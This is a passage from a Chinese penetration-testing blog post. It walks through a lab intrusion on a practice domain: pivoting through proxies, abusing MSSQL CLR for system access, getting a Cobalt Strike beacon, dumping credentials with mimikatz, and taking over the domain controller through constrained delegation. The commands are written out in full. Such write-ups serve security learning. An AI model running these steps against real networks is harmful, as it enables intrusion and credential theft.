ping不了10.10.20.12是因为10.10.20.12网络发现没有打开</p><p>现在kaliip为192.168.0.124</p><p>好 先把之前做过的再做一遍:yellow_heart:</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211130190143912.png" srcset="/img/loading.gif" lazyload alt="image-20211130190143912"></p><p>果然是网络配置的问题（weblogic服务器主机配置了“关闭网络发现”）</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211130190200699.png" srcset="/img/loading.gif" lazyload alt="image-20211130190200699"></p><h4 id="为什么启动不了网络发现"><a href="#为什么启动不了网络发现" class="headerlink" title="为什么启动不了网络发现"></a>为什么启动不了网络发现</h4><p>有意思的是一开始我关闭网络发现后全是10.10.20.7ping不了10.10.20.12</p><p>后来我启用网络发现后直接关闭这个窗口了 然后去10.10.20.7那台主机</p><p>发现可以ping10.10.20.12，但是当我再次打开这个窗口时发现此时是“关闭网络发现”</p><p>但是两者都是可以互相ping通的，我也不知道啥原因</p><p>1.按下WIN+R，然后输入services.msc 回车</p><p>2、然后检查以下几个服务，看是否为启动状态；</p><p>　　Function Discovery Resource Publication</p><p>　　SSDP Discovery</p><p>　　UPnP Device Host</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211130191635347.png" srcset="/img/loading.gif" lazyload alt="image-20211130191635347"></p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211130191750030.png" srcset="/img/loading.gif" lazyload alt="image-20211130191750030"></p><p>这样就可以</p><p>那么上述步骤怎么用指令来操作呢</p><p>这就需要逐步cmd或者powshell指令操作了</p><p>但是目前只找到了可以cmd直接打开services.msc，但是你用cs执行这个命令的话是回显不出来的，但是人家电脑上看的到:joy: 把这个列为未来计划 后来加以补充</p><p>后面找到了还有这些方法</p><p>方法二：</p><p>reg add 将新的子项或项添加到注册表中</p><p>　　语法：reg add KeyName [&#x2F;v EntryName|&#x2F;ve] [&#x2F;t DataType] [&#x2F;s separator] [&#x2F;d value] [&#x2F;f]</p><p>这种命令叫DOS命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">参数<br><br>　　KeyName<br><br>　　指定子项的完全路径。对于远程计算机，请在\\ComputerName\PathToSubkey中的子项路径前包含计算机名称。忽略ComputerName会导致默认对本地计算机进行操作。以相应的子目录树开始路径。有效子目录树为HKLM、HKCU、HKCR、HKU以及HKCC。<br><br>　　/v EntryName<br><br>　　删除子项下的特定项。如果未指定项，则将删除子项下的所有项和子项。<br><br>　　/ve<br><br>　　指定只可以删除为空值的项。<br><br>　　/va<br><br>　　删除指定子项下的所有项。使用本参数不能删除指定子项下的子项。<br><br>　　/f<br><br>　　无需请求确认而删除现有的注册表子项或项。<br><br>　　/?<br><br>　　在命令提示符显示帮助。<br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash"> /k reg delete <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe&quot;</span> /f（任务栏里的任务管理器为灰色）</span><br><br>　　<span class="hljs-keyword">cmd</span><span class="language-bash"> /k reg delete <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg&quot;</span> /f（删除MSConfig启动里的未勾选项目）</span><br><br>　　<span class="hljs-keyword">cmd</span><span class="language-bash"> /k reg delete <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ctfmon.exe&quot;</span> /f（删除CTFMON的镜像劫持）</span><br><br>　　<span class="hljs-keyword">cmd</span><span class="language-bash"> /k reg delete <span class="hljs-string">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TrayNotify&quot;</span> /v IconStreams /f</span><br><br>　　<span class="hljs-keyword">cmd</span><span class="language-bash"> /k reg delete <span class="hljs-string">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TrayNotify&quot;</span> /v PastIconsStream /f（删除通知区域的历史记录）</span><br></code></pre></td></tr></table></figure><p>而注册表和服务在（权限维持）后门持久化中也占有重要作用：开代理和挂载荷啥的</p><p>参考：<a target="_blank" rel="noopener" href="https://www.baidu.com/link?url=Zemob89xtz4ZFM1uQG4ftTrPUbN_Lb9NpehE3Gr-s9iDDblEz9T-SOM1d0CqE3ejmpsfMv4t09FWnxsYMsGOGaN53ZD8ACzPOAvSbv0LaUe&wd=&eqid=e34484b600034bfd0000000661a72954">https://www.baidu.com/link?url=Zemob89xtz4ZFM1uQG4ftTrPUbN_Lb9NpehE3Gr-s9iDDblEz9T-SOM1d0CqE3ejmpsfMv4t09FWnxsYMsGOGaN53ZD8ACzPOAvSbv0LaUe&amp;wd=&amp;eqid=e34484b600034bfd0000000661a72954</a></p><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fanyf/p/4221488.html">https://www.cnblogs.com/fanyf/p/4221488.html</a></p><h4 id="这里又不得不提到一个后门持久化的图形化工具了"><a href="#这里又不得不提到一个后门持久化的图形化工具了" class="headerlink" title="这里又不得不提到一个后门持久化的图形化工具了"></a>这里又不得不提到一个后门持久化的图形化工具了</h4><p>，当然也可以直接使用reg命令打开（说实话reg命令不太好搞，因为不知道各个指令的详细操作（对应工具的部位命令），后面会做一次专题）。不过其实也不需要用到图形化工具，reg里面可以直接用，重要的还是要使用命令启用reg</p><p>就是说，我都能启用图形化工具了，那我直接去regit里面创建服务不就行了。还不用下载工具</p><p>不过工具多的是稳定性（怕你不会配置啥的）:sheep:</p><p>有个工具nnsm 可以看这个</p><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&mid=2247492683&idx=1&sn=03023cbaf80496045a1cf936a7ffb41d&chksm=ce5dc62af92a4f3c9930c7603b59117f36e8c5f6f76775a4370de83de6f3847e53e38901a28e&mpshare=1&scene=23&srcid=1130tq01JPNO0cLQpaPGxWRz&sharer_sharetime=1638271197400&sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd">https://mp.weixin.qq.com/s?__biz=Mzg2NTA4OTI5NA==&amp;mid=2247492683&amp;idx=1&amp;sn=03023cbaf80496045a1cf936a7ffb41d&amp;chksm=ce5dc62af92a4f3c9930c7603b59117f36e8c5f6f76775a4370de83de6f3847e53e38901a28e&amp;mpshare=1&amp;scene=23&amp;srcid=1130tq01JPNO0cLQpaPGxWRz&amp;sharer_sharetime=1638271197400&amp;sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd</a></p><h4 id="怎样启动网络发现（用指令）"><a href="#怎样启动网络发现（用指令）" class="headerlink" title="怎样启动网络发现（用指令）"></a>怎样启动网络发现（用指令）</h4><p>那实战中遇到这种情况有什么方法吗？</p><p>首先要把防火墙关掉是肯定的</p><p>win7（其他版本还没试过，不过应该都行）有下面几个个方法</p><ol><li><p>新建一个记事本文件，在里面输入内容：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">@echo <span class="hljs-keyword">off</span><br>:Win7网络发现依赖的服务:<br>:Dnscache	DNS Client<br>:SSDPSRV	SSDP Discovery<br>:PlugPlay	Plug <span class="hljs-keyword">and</span> Play<br>:FDResPub	<span class="hljs-keyword">Function</span> Discovery Resource <span class="hljs-keyword">Publication</span> 功能发现资源发布<br>sc query SSDPSRV|findstr /i &quot;SSDPSRV state&quot;<br>sc query Dnscache|findstr /i &quot;Dnscache state&quot;<br>sc query PlugPlay|findstr /i &quot;PlugPlay state&quot;<br>sc query FDResPub|findstr /i &quot;FDResPub state&quot;<br>sc config SSDPSRV start= AUTO<br>sc config Dnscache start= AUTO<br>sc config PlugPlay start= AUTO<br>sc config FDResPub start= AUTO<br>sc <span class="hljs-keyword">start</span> SSDPSRV<br>sc <span class="hljs-keyword">start</span> Dnscache<br>sc <span class="hljs-keyword">start</span> PlugPlay<br>sc <span class="hljs-keyword">start</span> FDResPub<br></code></pre></td></tr></table></figure><p>然后保存为TurnOnNetworkDiscovey.bat。</p><p>双击运行TurnOnNetworkDiscovey.bat</p></li></ol><p>继续继续</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211130193820591.png" srcset="/img/loading.gif" lazyload alt="image-20211130193820591"></p><p>先提权</p><p>再shell net user &#x2F;domain看下域用户</p><p><img src="C:\Users\e'e't\AppData\Roaming\Typora\typora-user-images\image-20211130193855997.png" srcset="/img/loading.gif" lazyload alt="image-20211130193855997"></p><p>net group “Domain Controllers” &#x2F;domian 定位到域控 DC IP 为：<code>10.10.10.8</code></p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LL9icoGibyRCia9G4YJVeiazSNLialJ6FhvuRV0FEM47XO6pZQB03yQiaiaficd1xkP4IkuNGu4ES7elEz7Wg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" srcset="/img/loading.gif" lazyload alt="å¾ç"></p><p>拿DC、</p><p>首先当前进程是没有域管的，所以暂且放弃令牌窃取：</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201165829111.png" srcset="/img/loading.gif" lazyload alt="image-20211201165829111"></p><p>传个Adfind上去</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">AdFind 一款C</span><span class="hljs-literal">++</span><span class="hljs-comment">编写的域内查询信息的工具</span> <br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> AdFind.<span class="hljs-keyword">exe</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">10.8</span> -<span class="hljs-keyword">u</span> saul -<span class="hljs-keyword">up</span> admin!@#<span class="hljs-number">45</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=redteam,DC=red&quot;</span> -<span class="hljs-keyword">f</span> <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> <span class="hljs-keyword">cn</span> distinguishedName msds-allowedtodelegateto<br></code></pre></td></tr></table></figure><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201171644695.png" srcset="/img/loading.gif" lazyload alt="image-20211201171644695"></p><p>找到了一个 sqlserver 的用户是被设置了约束委派，得想办法搞到这个用户的账密。</p><p>传个fscan上去扫一下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">shell</span> fscan.exe -np -h <span class="hljs-number">10.10.10.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201172138319.png" srcset="/img/loading.gif" lazyload alt="image-20211201172138319"></p><p>发现 sqlserver 这台机器开放了 80、1433（mssql）：</p><p>ew配合sock64加代理一下railgun对sql进行爆破</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201172809091.png" srcset="/img/loading.gif" lazyload alt="image-20211201172809091"></p><p>这次代理就有难度了</p><p>因为10.10.10.18是在第三层</p><p>而win主机在第一层，ping不到第三层。</p><p>刚好ew是适合三层代理的</p><p>先分析一下局势</p><p>win是192.168</p><p>第二层是（192.168.0.154）10.10.20.12 （10.10.20.7）10.10.10.7</p><p>第三层代理地址 10.10.10.7 目标10.10.10.18</p><p>kali执行</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">./ew_for_Linux32</span> <span class="hljs-string">-s</span> <span class="hljs-string">lcx_listen</span> <span class="hljs-string">-l</span>  <span class="hljs-number">1080</span>   <span class="hljs-string">-e</span> <span class="hljs-number">1024</span><br></code></pre></td></tr></table></figure><p>10.10.20.12执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew_for_Win</span>.exe -s ssocksd    -l <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>10.10.10.7执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew_for_Win</span>.exe -s lcx_slave  -d <span class="hljs-number">192.168.0.124</span> -e <span class="hljs-number">1024</span> -f <span class="hljs-number">10.10.20.12</span> -g <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201181632862.png" srcset="/img/loading.gif" lazyload alt="image-20211201181632862"></p><p>无法连接 哪里出了问题?</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201183329083.png" srcset="/img/loading.gif" lazyload alt="image-20211201183329083"></p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201183334564.png" srcset="/img/loading.gif" lazyload alt="image-20211201183334564"></p><p>这两个都开着 但是没连上</p><p>换一个 将weblogic的命令改为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew_for_Win</span>.exe -s lcx_tran   -l  <span class="hljs-number">1080</span>   -f <span class="hljs-number">10.10.20.12</span> -g <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>不管了 那就直接开3389</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201194201408.png" srcset="/img/loading.gif" lazyload alt="image-20211201194201408"></p><p>多重开启 （10.10.20.7和10.10.20.12 都开）</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201194617548.png" srcset="/img/loading.gif" lazyload alt="image-20211201194617548"></p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201195017882.png" srcset="/img/loading.gif" lazyload alt="image-20211201195017882"></p><p>ok</p><p>目标是 iis，那么想办法找到 iis 到目录写个一句话吧。</p><p>一般 iis 的目录是：<code>C:\inetpub\wwwroot</code>，那么查看下是否存在：</p><p>存在是存在 但是不能写文件</p><p>使用 SharpSQLTools 开启目标 clr：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">SharpSQLTools.exe <span class="hljs-number">10.10</span>.<span class="hljs-number">10.18</span> sa sa <span class="hljs-keyword">master</span> <span class="hljs-title">install_clr</span> whoami<br></code></pre></td></tr></table></figure><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201195805667.png" srcset="/img/loading.gif" lazyload alt="image-20211201195805667"></p><p>然后启用并调用命令：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">SharpSQLTools.exe <span class="hljs-number">10.10</span>.<span class="hljs-number">10.18</span> sa sa <span class="hljs-keyword">master</span> <span class="hljs-title">enable_clr</span><br>SharpSQLTools.exe <span class="hljs-number">10.10</span>.<span class="hljs-number">10.18</span> sa sa <span class="hljs-keyword">master</span> <span class="hljs-title">clr_efspotato</span> whoami<br></code></pre></td></tr></table></figure><p>这下子就是一个系统权限了！</p><p>随后添加了一个管理员：</p><p>但还是不能写一句话</p><p>还是用 MSF 把：</p><p>exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_clr_payload</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201200102319.png" srcset="/img/loading.gif" lazyload alt="image-20211201200102319"></p><p>然后找到了一个可读可写目录上传 exe 成功，然后中转再上线到 CobaltStrike：</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201200125464.png" srcset="/img/loading.gif" lazyload alt="image-20211201200125464"></p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201200809694.png" srcset="/img/loading.gif" lazyload alt="image-20211201200809694"></p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201200817177.png" srcset="/img/loading.gif" lazyload alt="image-20211201200817177"></p><p>成功上线</p><p>提个权</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201201127547.png" srcset="/img/loading.gif" lazyload alt="image-20211201201127547"></p><p>mimikatz抓一下密码</p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201201537348.png" srcset="/img/loading.gif" lazyload alt="image-20211201201537348"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">user</span> <span class="hljs-title">: redteam</span>\sqlserverpass : Server12345<br></code></pre></td></tr></table></figure><p>之前信息搜集的时候我们知道 <code>sqlserver</code> 是一个约束委派的用户，我们可以通过</p><h3 id="约束委派攻击来接管域控。"><a href="#约束委派攻击来接管域控。" class="headerlink" title="约束委派攻击来接管域控。"></a>约束委派攻击来接管域控。</h3><p>1.利用 kekeo 请求该用户的 TGT：<code>TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi</code></p><figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs profile">kekeo.exe &quot;tgt::ask /user:sqlserver /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi&quot;<br></code></pre></td></tr></table></figure><p>2.然后使用这张 TGT (<a href="mailto:&#84;&#x47;&#x54;&#95;&#x73;&#113;&#x6c;&#115;&#x65;&#x72;&#x76;&#x65;&#x72;&#64;&#82;&#x45;&#68;&#84;&#x45;&#x41;&#x4d;&#x2e;&#82;&#69;&#x44;&#95;&#x6b;&#114;&#x62;&#116;&#103;&#116;">&#84;&#x47;&#x54;&#95;&#x73;&#113;&#x6c;&#115;&#x65;&#x72;&#x76;&#x65;&#x72;&#64;&#82;&#x45;&#68;&#84;&#x45;&#x41;&#x4d;&#x2e;&#82;&#69;&#x44;&#95;&#x6b;&#114;&#x62;&#116;&#103;&#116;</a><del><a href="mailto:&#x72;&#x65;&#x64;&#x74;&#x65;&#97;&#109;&#46;&#x72;&#101;&#x64;&#x40;&#x52;&#x45;&#68;&#x54;&#69;&#x41;&#x4d;&#x2e;&#x52;&#69;&#68;&#46;&#x6b;&#x69;&#x72;&#x62;&#x69;">&#x72;&#x65;&#x64;&#x74;&#x65;&#97;&#109;&#46;&#x72;&#101;&#x64;&#x40;&#x52;&#x45;&#68;&#x54;&#69;&#x41;&#x4d;&#x2e;&#x52;&#69;&#68;&#46;&#x6b;&#x69;&#x72;&#x62;&#x69;</a>) 获取域机器的 ST：<a href="mailto:&#x54;&#71;&#83;&#95;&#65;&#100;&#x6d;&#105;&#x6e;&#x69;&#x73;&#116;&#x72;&#97;&#x74;&#x6f;&#114;&#64;&#x72;&#x65;&#100;&#116;&#101;&#x61;&#x6d;&#46;&#x72;&#x65;&#x64;">&#x54;&#71;&#83;&#95;&#65;&#100;&#x6d;&#105;&#x6e;&#x69;&#x73;&#116;&#x72;&#97;&#x74;&#x6f;&#114;&#64;&#x72;&#x65;&#100;&#116;&#101;&#x61;&#x6d;&#46;&#x72;&#x65;&#x64;</a>@REDTEAM.RED_cifs</del><a href="mailto:&#111;&#119;&#97;&#x2e;&#x72;&#x65;&#100;&#x74;&#x65;&#x61;&#109;&#46;&#114;&#101;&#x64;&#64;&#82;&#x45;&#68;&#x54;&#x45;&#x41;&#x4d;&#x2e;&#x52;&#x45;&#68;&#x2e;&#x6b;&#105;&#114;&#98;&#105;">&#111;&#119;&#97;&#x2e;&#x72;&#x65;&#100;&#x74;&#x65;&#x61;&#109;&#46;&#114;&#101;&#x64;&#64;&#82;&#x45;&#68;&#x54;&#x45;&#x41;&#x4d;&#x2e;&#x52;&#x45;&#68;&#x2e;&#x6b;&#105;&#114;&#98;&#105;</a></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">kekeo.exe <span class="hljs-string">&quot;tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot;</span><br></code></pre></td></tr></table></figure><p>3.使用 mimikatz 将 ST2 导入当前会话即可，运行 mimikatz 进行 ptt：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">mimikatz kerberos::ptt <span class="hljs-title class_">TGS_Administrator</span><span class="hljs-variable">@redteam</span>.red<span class="hljs-variable">@REDTEAM</span>.<span class="hljs-title class_">RED_cifs</span>~owa.redteam.red<span class="hljs-variable">@REDTEAM</span>.<span class="hljs-title class_">RED</span>.kirbi<br></code></pre></td></tr></table></figure><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201203619660.png" srcset="/img/loading.gif" lazyload alt="image-20211201203619660"></p><p><img src="/../../Pictures/QQ%E6%B5%8F%E8%A7%88%E5%99%A8%E6%88%AA%E5%9B%BE/image-20211201204022128.png" srcset="/img/loading.gif" lazyload alt="image-20211201204022128"></p></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class="category-chains"><span class="category-chain"><a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a></span></span></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">#学习笔记</a> <a href="/tags/Hexo/">#Hexo</a></div></div><div class="license-box my-3"><div class="license-title"><div>从外网 Weblogic 打进内网，再到约束委派接管域控205359</div><div>http://example.com/从外网 Weblogic 打进内网，再到约束委派接管域控205359.html</div></div><div class="license-meta"><div class="license-meta-item"><div>Author</div><div>CDxiaodong</div></div><div class="license-meta-item license-meta-date"><div>Posted on</div><div>December 1, 2021</div></div><div class="license-meta-item"><div>Licensed under</div><div><a target="_blank" href="https://creativecommons.org/licenses/by/4.0/"><span class="hint--top hint--rounded" aria-label="BY - Attribution"><i class="iconfont icon-by"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/%E5%88%B6%E4%BD%9Ctwitter%E7%88%AC%E8%99%AB.html" title="制作twitter爬虫"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">制作twitter爬虫</span> <span class="visible-mobile">Previous</span></a></article><article class="post-next col-6"><a href="/%E6%98%8E%E6%BA%90%E4%BA%91.html" title="xx云泄露(去隐 防github)"><span class="hidden-mobile">xx云泄露(去隐 防github)</span> <span class="visible-mobile">Next</span> <i class="iconfont icon-arrowright"></i></a></article></div></div></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i> <span>Table of Contents</span></p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">Search</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">Keyword</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><a href="https://github.com/cdxiaodong" target="_blank" rel="nofollow noopener"><span>CD</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/cdxiaodong" target="_blank" rel="nofollow noopener"><span>XD</span></a></div><div class="statistics"><span id="busuanzi_container_site_pv" style="display:none">Views: <span id="busuanzi_value_site_pv"></span> </span><span id="busuanzi_container_site_uv" style="display:none">Visitors: <span id="busuanzi_value_site_uv"></span></span></div></div></footer><script src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",function(){NProgress.done()})</script><script src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js"></script><script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script><script>!function(t){var e=Fluid.plugins.typing,i=t.getElementById("subtitle");i&&e&&e(i.getAttribute("data-typed-text"))}((window,document))</script><script src="/js/img-lazyload.js"></script><script>Fluid.utils.createScript("https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js",function(){var t,o=jQuery("#toc");0!==o.length&&window.tocbot&&(t=jQuery("#board-ctn").offset().top,window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-t},CONFIG.toc)),0<o.find(".toc-list-item").length&&o.css("visibility","visible"),Fluid.events.registerRefreshCallback(function(){if("tocbot"in window){tocbot.refresh();var t=jQuery("#toc");if(0===t.length||!tocbot)return;0<t.find(".toc-list-item").length&&t.css("visibility","visible")}}))})</script><script src="https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js"></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });</script><script>Fluid.utils.createScript("https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js",function(){Fluid.plugins.fancyBox()})</script><script>Fluid.plugins.imageCaption()</script><script src="/js/local-search.js"></script><script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">Blog works best with JavaScript enabled</div></noscript></body></html>